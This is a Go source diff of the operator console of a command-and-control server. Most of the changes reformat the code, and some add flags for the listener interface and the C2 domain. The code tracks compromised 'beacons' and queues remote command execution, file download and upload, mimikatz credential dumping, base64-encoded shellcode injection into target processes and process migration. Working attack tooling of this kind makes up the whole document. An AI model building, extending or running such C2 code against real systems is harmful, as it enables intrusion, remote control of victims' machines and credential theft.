@@ -1,51 +1,52 @@
 package main
 
 import (
-	"os"
-	"net"
-	"fmt"
-	"time"
 	"bufio"
+	"encoding/base64"
+	"encoding/json"
+	"flag"
+	"fmt"
+	"io/ioutil"
+	"math/rand"
+	"net"
+	"os"
 	"strconv"
 	"strings"
-	"math/rand"
-	"io/ioutil"
-	"encoding/json"
-	"encoding/base64"
+	"time"
 )
 
 type CommandUpdate struct {
-	Ip string
-	Id string
-	User string
-	Platform string
-	Arch string
-	Pid string
-	Pname string
-	Type string
+	Ip           string
+	Id           string
+	User         string
+	Platform     string
+	Arch         string
+	Pid          string
+	Pname        string
+	Type         string
 	ProxyClients []string
-	Data string
+	Data         string
 }
 
 type Beacon struct {
-	Ip string
-	Id string
-	User string
-	Platform string
-	Arch string
-	Pid string
-	Pname string
-	ExecBuffer []string
-	DownloadBuffer []string
-	UploadBuffer []string	
-	ShellcodeBuffer []string
+	Ip                string
+	Id                string
+	User              string
+	Platform          string
+	Arch              string
+	Pid               string
+	Pname             string
+	ExecBuffer        []string
+	DownloadBuffer    []string
+	UploadBuffer      []string
+	ShellcodeBuffer   []string
 	ProxyClientBuffer []string
-	ProxyClients []string
-	LastSeen time.Time
+	ProxyClients      []string
+	LastSeen          time.Time
 }
 
 type BeaconMessage struct {
-	Data []byte
+	Data  []byte
 	Route []byte
 }
 
@@ -58,43 +59,43 @@ var modules []*Module = make([]*Module, 0)
 var activeBeacon *Beacon
 var securityContext *SecurityContext
 var activeBeaconInteractive = false
-var cmdArgs = map[string]string {
-    "help": "<command>...",
-	"list": "",
-	"listeners": "",
+var cmdArgs = map[string]string{
+	"help":         "<command>...",
+	"list":         "",
+	"listeners":    "",
 	"httplistener": "<iface> <hostname> <port>",
-    "exec": "<beacon id OR index> <command>...",
-    "create": "<listener> <target> <target arch>...",
-	"download": "<beacon id OR index> <remote file> OR <remote file>...",
-	"upload": "<beacon id OR index> <local file> OR <local file>...",
-	"use": "<beacon id OR index>",
-	"script": "<beacon id OR index> <local file path> <remote executor path>",
+	"exec":         "<beacon id OR index> <command>...",
+	"create":       "<listener> <target> <target arch>...",
+	"download":     "<beacon id OR index> <remote file> OR <remote file>...",
+	"upload":       "<beacon id OR index> <local file> OR <local file>...",
+	"use":          "<beacon id OR index>",
+	"script":       "<beacon id OR index> <local file path> <remote executor path>",
 	// beacon commands
-	"mimikatz": "<arguments>...",
+	"mimikatz":  "<arguments>...",
 	"shellcode": "<path to shellcode> <PID>",
-	"migrate": "<PID>",
-	"plist": "",
+	"migrate":   "<PID>",
+	"plist":     "",
 }
 
-func getIfaceIp(iface string) (string) {
+func getIfaceIp(iface string) string {
 	ief, _ := net.InterfaceByName(iface)
 	addrs, _ := ief.Addrs()
 	return strings.Split(addrs[0].String(), "/")[0]
 }
 
-func registerBeacon(updateData CommandUpdate) (*Beacon) {
+func registerBeacon(updateData CommandUpdate) *Beacon {
 	var beacon *Beacon
 	for _, b := range beacons {
 		if b.Id == updateData.Id && b.Ip == updateData.Ip {
 			b.Ip = updateData.Ip
-			beacon = b 
+			beacon = b
 		}
 	}
 
 	if beacon == nil || beacon.Ip == "n/a" {
 		info("[+] New beacon " + updateData.Id + "@" + updateData.Ip)
 		webInterfaceUpdates = append(webInterfaceUpdates, &WebUpdate{"New Beacon", updateData.Id + "@" + updateData.Ip})
-		beacon = &Beacon { updateData.Ip, updateData.Id, updateData.User, updateData.Platform, updateData.Arch, updateData.Pid, updateData.Pname, nil, nil, nil, nil, nil, nil, time.Now() }
+		beacon = &Beacon{updateData.Ip, updateData.Id, updateData.User, updateData.Platform, updateData.Arch, updateData.Pid, updateData.Pname, nil, nil, nil, nil, nil, nil, time.Now()}
 		beacons = append(beacons, beacon)
 	} else {
 		beacon.LastSeen = time.Now()
@@ -103,15 +104,15 @@ func registerBeacon(updateData CommandUpdate) (*Beacon) {
 	return beacon
 }
 
-func convertTime(t time.Duration) (string) {
+func convertTime(t time.Duration) string {
 	return fmt.Sprintf("%d", int(t.Hours())) + ":" + fmt.Sprintf("%d", int(t.Minutes())) + ":" + fmt.Sprintf("%.2fs", t.Seconds())
 }
 
 func listBeacons() {
 	header := "#\tID\t\tUser\t\tIP\t\tProcess\t\tPlatform\tArch\tLast Seen\n" +
-				   "---------------------------------------------------------------------------------------------------------"
+		"---------------------------------------------------------------------------------------------------------"
 	formatString := "%d\t%-12s\t%-15s\t%-15s\t%-15s\t%-8s\t%-5s\t%-15s\n"
-	
+
 	info(header)
 	for i, b := range beacons {
 		diff := time.Now().Sub(b.LastSeen)
@@ -126,12 +127,12 @@ func listBeacons() {
 
 func genRandID() string {
 	rand.Seed(time.Now().UTC().UnixNano())
-    b := make([]byte, idLen)
-    
+	b := make([]byte, idLen)
+
 	for i := range b {
-        b[i] = idBytes[rand.Intn(len(idBytes))]
-    }
-    
+		b[i] = idBytes[rand.Intn(len(idBytes))]
+	}
+
 	return string(b)
 }
 
@@ -154,10 +155,10 @@ func execModuleHelper(beacon *Beacon, module *Module, arguments string) {
 
 	encoded := base64.StdEncoding.EncodeToString(shellcode)
 	beacon.ShellcodeBuffer = append(beacon.ShellcodeBuffer, encoded)
-	beacon.ShellcodeBuffer = append(beacon.ShellcodeBuffer, "module " + arguments)
+	beacon.ShellcodeBuffer = append(beacon.ShellcodeBuffer, "module "+arguments)
 }
 
-func execModuleOnBeacon(cmd[] string) {
+func execModuleOnBeacon(cmd []string) {
 	if cmd[1] == "list" {
 		for i, module := range modules {
 			info("[" + strconv.Itoa(i) + "] " + module.Name)
@@ -174,7 +175,7 @@ func execModuleOnBeacon(cmd[] string) {
 			execModuleHelper(b, module, arguments)
 			info("Added module command to buffer for beacon " + b.Id + "@" + b.Ip)
 		}
-		return	
+		return
 	}
 
 	var beacon *Beacon = activeBeacon
@@ -201,7 +202,7 @@ func execOnBeacon(cmd []string) {
 			b.ExecBuffer = append(b.ExecBuffer, strings.Join(cmd[2:], " "))
 			info("Added exec command to buffer for beacon " + b.Id + "@" + b.Ip)
 		}
-		return	
+		return
 	}
 
 	var beacon *Beacon = activeBeacon
@@ -230,7 +231,7 @@ func downloadFile(cmd []string) {
 		for _, b := range beacons {
 			b.DownloadBuffer = append(b.DownloadBuffer, cmd[2])
 		}
-		return	
+		return
 	}
 
 	var beacon *Beacon = activeBeacon
@@ -253,7 +254,7 @@ func uploadFile(cmd []string) {
 		for _, b := range beacons {
 			b.UploadBuffer = append(b.UploadBuffer, cmd[2])
 		}
-		return	
+		return
 	}
 
 	var beacon *Beacon = activeBeacon
@@ -271,7 +272,7 @@ func uploadFile(cmd []string) {
 	}
 }
 
-func getBeaconByIdOrIndex(id string) (*Beacon) {
+func getBeaconByIdOrIndex(id string) *Beacon {
 	var beacon *Beacon
 
 	for _, b := range beacons {
@@ -281,7 +282,7 @@ func getBeaconByIdOrIndex(id string) (*Beacon) {
 	}
 
 	bId, err := strconv.Atoi(id)
-	
+
 	if beacon != nil || (err == nil && bId < len(beacons)) {
 		if beacon == nil {
 			beacon = beacons[bId]
@@ -292,7 +293,7 @@ func getBeaconByIdOrIndex(id string) (*Beacon) {
 	}
 }
 
-func checkArgs(cmd[] string) (bool) {
+func checkArgs(cmd []string) bool {
 	if cmdArgs[cmd[0]] == "" {
 		return true
 	}
@@ -331,10 +332,10 @@ func startHttpListener(cmd []string) {
 		return
 	}
 
-	var HttpListener = HttpListener {
-		Iface: cmd[1],
+	var HttpListener = HttpListener{
+		Iface:    cmd[1],
 		Hostname: cmd[2],
-		Port: port,
+		Port:     port,
 	}
 
 	err = HttpListener.startListener()
@@ -360,7 +361,7 @@ func migrateBeacon(cmd []string) {
 	}
 
 	filename := "out/" + activeBeacon.Id
-	
+
 	if activeBeacon.Platform == "windows" {
 		filename += ".exe"
 	}
@@ -373,11 +374,11 @@ func migrateBeacon(cmd []string) {
 	}
 
 	f, _ := os.Open(filename)
-    reader := bufio.NewReader(f)
-    content, _ := ioutil.ReadAll(reader)
-    encoded := base64.StdEncoding.EncodeToString(content)
+	reader := bufio.NewReader(f)
+	content, _ := ioutil.ReadAll(reader)
+	encoded := base64.StdEncoding.EncodeToString(content)
 	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, encoded)
-	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, "migrate " + cmd[1])
+	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, "migrate "+cmd[1])
 }
 
 func injectShellcode(cmd []string) {
@@ -393,17 +394,17 @@ func injectShellcode(cmd []string) {
 
 	info(cmd[0], cmd[1])
 	f, _ := os.Open(cmd[1])
-    reader := bufio.NewReader(f)
-    content, _ := ioutil.ReadAll(reader)
-    encoded := base64.StdEncoding.EncodeToString(content)
+	reader := bufio.NewReader(f)
+	content, _ := ioutil.ReadAll(reader)
+	encoded := base64.StdEncoding.EncodeToString(content)
 	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, encoded)
-	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, "local " + cmd[2])
+	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, "local "+cmd[2])
 }
 
 func notifyBeaconOfProxyUpdate(proxy *Beacon, targetId string) {
-	pseudoBeacon := Beacon { "0.0.0.0", targetId, "",  "", "", "", "", nil, nil, nil, nil, nil, nil, time.Now() }
+	pseudoBeacon := Beacon{"0.0.0.0", targetId, "", "", "", "", "", nil, nil, nil, nil, nil, nil, time.Now()}
 	data, err := json.Marshal(pseudoBeacon)
-	
+
 	if err != nil {
 		info("Failed to notify beacon of proxy update.")
 		return
@@ -420,15 +421,15 @@ func updateModule(name string, language string, source string) {
 			return
 		}
 	}
-	
+
 	newMod := newModule(name, source, language)
 	newMod.writeToDisk()
 	modules = append(modules, newMod)
 }
 
 func processInput(input string) {
-	cmd := strings.Fields(input);
-	
+	cmd := strings.Fields(input)
+
 	if len(cmd) > 0 && checkArgs(cmd) {
 		if activeBeaconInteractive {
 			if activeBeacon == nil {
@@ -443,7 +444,7 @@ func processInput(input string) {
 		} else {
 			switch cmd[0] {
 			//case "script":
-				//uploadAndExec(cmd)
+			//uploadAndExec(cmd)
 			case "listeners":
 				listListeners()
 			case "httplistener":
@@ -457,17 +458,17 @@ func processInput(input string) {
 				}
 
 				l, err := strconv.Atoi(cmd[1])
-				
+
 				if err != nil {
 					info("usage: " + cmdArgs["create"])
 					return
 				}
-				
+
 				if len(listeners) <= l || l < 0 {
 					info("Listener " + cmd[1] + " does not exist, list existing listeners with 'listeners'")
 					return
 				}
-				
+
 				go func() {
 					redirectStdIn = true
 					if len(cmd) == 2 {
@@ -552,9 +553,9 @@ func handleInput() {
 		prompt()
 		input, err := reader.ReadString('\n')
 
-        if err != nil {
-            fmt.Fprintln(os.Stderr, err)
-        }
+		if err != nil {
+			fmt.Fprintln(os.Stderr, err)
+		}
 
 		processInput(input)
 	}
@@ -567,7 +568,7 @@ func appendStdoutBuffers(out string) {
 }
 
 func info(info ...string) {
-	for _, s := range info  {
+	for _, s := range info {
 		fmt.Println("[+] " + s)
 		appendStdoutBuffers(s + "\n")
 	}
@@ -583,14 +584,14 @@ func readLine() string {
 }
 
 func loadModules() {
-    files, err := ioutil.ReadDir("modules")
+	files, err := ioutil.ReadDir("modules")
 
-    if err != nil {
+	if err != nil {
 		return
 	}
- 
-    for _, f := range files {
-        nameSplit := strings.Split(f.Name(), ".")
+
+	for _, f := range files {
+		nameSplit := strings.Split(f.Name(), ".")
 		name := nameSplit[0]
 		fileType := nameSplit[1]
 
@@ -605,14 +606,20 @@ func loadModules() {
 		} else if fileType == "go" {
 			modules = append(modules, newModule(name, string(source), "Go"))
 		}
-    }
+	}
 }
 
 func main() {
+	var iface = flag.String("i", "wlp2s0", "Interface to listen on")
+	var domain = flag.String("d", "command.com", "Domain name for C2 server")
+	var port = flag.Int("p", 8000, "Port for web interface")
+
+	flag.Parse()
+
 	securityContext = newSecurityContext()
 
-	var WebInterface = WebInterface {
-		port: 8000,
+	var WebInterface = WebInterface{
+		port: *port,
 	}
 
 	var err = WebInterface.startListener()
@@ -620,10 +627,10 @@ func main() {
 		info("Failed to start web interface.")
 	}
 
-	var HttpListenerLocalhost = HttpListener {
-		Iface: "enp0s20f0u1",
-		Hostname: "command.com",
-		Port: 8000,
+	var HttpListenerLocalhost = HttpListener{
+		Iface:    *iface,
+		Hostname: *domain,
+		Port:     8000,
 	}
 
 	err = HttpListenerLocalhost.startListener()
